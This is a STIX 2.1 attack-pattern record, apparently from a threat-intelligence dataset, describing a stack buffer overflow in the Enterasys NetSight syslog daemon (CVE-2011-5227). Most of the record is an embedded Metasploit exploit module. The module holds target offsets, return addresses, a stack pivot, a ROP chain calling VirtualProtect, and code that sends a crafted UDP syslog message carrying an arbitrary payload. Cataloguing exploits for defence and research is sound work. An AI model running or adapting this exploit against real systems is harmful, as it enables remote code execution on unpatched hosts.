{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4a37c2fa-7fbd-40b9-be55-62fdf9f1baba",
    "created": "2024-08-14T16:46:33.685655Z",
    "modified": "2024-08-14T16:46:33.685659Z",
    "name": "Enterasys NetSight nssyslogd.exe Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Enterasys NetSight. The vulnerability exists in the Syslog service (nssylogd.exe) when parsing a specially crafted PRIO from a syslog message. The module has been tested successfully on Enterasys NetSight 4.0.1.34 over Windows XP SP3 and Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/enterasys_netsight_syslog_bof.rb",
            "external_id": "enterasys_netsight_syslog_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5227"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Enterasys NetSight nssyslogd.exe Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Enterasys NetSight. The\n        vulnerability exists in the Syslog service (nssylogd.exe) when parsing a specially\n        crafted PRIO from a syslog message. The module has been tested successfully on\n        Enterasys NetSight 4.0.1.34 over Windows XP SP3 and Windows 2003 SP2.\n      },\n      'Author'         =>\n        [\n          'Jeremy Brown', # Vulnerability discovery\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-5227'],\n          ['OSVDB', '77971'],\n          ['BID', '51124'],\n          ['ZDI', '11-350']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n          'Space' => 3000,\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Enterasys NetSight 4.0.1.34 / Windows XP SP3',\n            {\n              'Offset' => 43,\n              'Ret' => 0x77c4e444 # ADD ESP,30 # POP EDX # RETN # from msvcrt\n            }\n          ],\n          ['Enterasys NetSight 4.0.1.34 / Windows 2003 SP2',\n            {\n              'Offset' => 43,\n              'Ret' => 0x77bdf444 # ADD ESP,30 # POP EDX # RETN # from msvcrt\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2011-12-19',\n      'DefaultTarget'  => 1\n      ))\n\n    register_options([ Opt::RPORT(514) ])\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\")[0].to_i\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\")[0].to_i\n  end\n\n  def get_stackpivot\n    stack_pivot = ''\n    case target.name\n    when /Windows XP SP3/\n      stack_pivot << [0x77c4e448].pack(\"V\") #ret\n      stack_pivot << [0x77c4e448].pack(\"V\") #ret\n      stack_pivot << [0x77c4e448].pack(\"V\") #ret\n      stack_pivot << [0x77c4e448].pack(\"V\") #ret\n      stack_pivot << [0x77c4e444].pack(\"V\") # ADD ESP,30 # POP EDX # RETN\n    when /Windows 2003 SP2/\n      stack_pivot << [0x77bdf448].pack(\"V\") #ret\n      stack_pivot << [0x77bdf448].pack(\"V\") #ret\n      stack_pivot << [0x77bdf448].pack(\"V\") #ret\n      stack_pivot << [0x77bdf448].pack(\"V\") #ret\n      stack_pivot << [0x77bdf444].pack(\"V\") # ADD ESP,30 # POP EDX # RETN\n    end\n    return stack_pivot\n  end\n\n  def get_payload\n    my_payload = ''\n\n    case target.name\n    when /Windows XP SP3/\n      jmp_esp = [0x77c35459].pack(\"V\")\n      my_payload << jmp_esp\n    when /Windows 2003 SP2/\n      rop_gadgets =\n        [\n          0x77bb2563, # POP EAX # RETN\n          0x77ba1114, # <- *&VirtualProtect()\n          0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN\n          junk,\n          0x77bb0c86, # XCHG EAX,ESI # RETN\n          0x77bc9801, # POP EBP # RETN\n          0x77be2265, # ptr to 'push esp #  ret'\n          0x77bb2563, # POP EAX # RETN\n          #0x03C0990F,\n          0x03c09f0f,\n          0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0xb00 -> ebx)\n          0x77bb48d3, # POP EBX, RET\n          0x77bf21e0, # .data\n          0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN\n          0x77bbfc02, # POP ECX # RETN\n          0x77bef001, # W pointer (lpOldProtect) (-> ecx)\n          0x77bd8c04, # POP EDI # RETN\n          0x77bd8c05, # ROP NOP (-> edi)\n          0x77bb2563, # POP EAX # RETN\n          0x03c0984f,\n          0x77bdd441, # SUB EAX, 03c0940f\n          0x77bb8285, # XCHG EAX,EDX # RETN\n          0x77bb2563, # POP EAX # RETN\n          nop,\n          0x77be6591, # PUSHAD # ADD AL,0EF # RETN\n        ].pack(\"V*\")\n      my_payload << rop_gadgets\n    end\n\n    my_payload << payload.encoded\n    return my_payload\n  end\n\n  def exploit\n    connect_udp\n\n    prio = \"<\"\n    prio << rand_text_alpha(19)\n    prio << get_stackpivot\n    prio << rand_text_alpha(4)\n    prio << [target.ret].pack(\"V\")\n    prio << \">\"\n\n    message = prio\n    message << rand_text_alpha(9 + (15 - Rex::Socket.source_address(datastore['RHOST']).length)) # Allow to handle the variable offset due to the source ip length\n    message << get_payload\n\n    print_status(\"#{rhost}:#{rport} - Trying to exploit #{target.name}...\")\n    udp_sock.put(message)\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-19",
    "x_mitre_platforms": [
        "win'"
    ]
}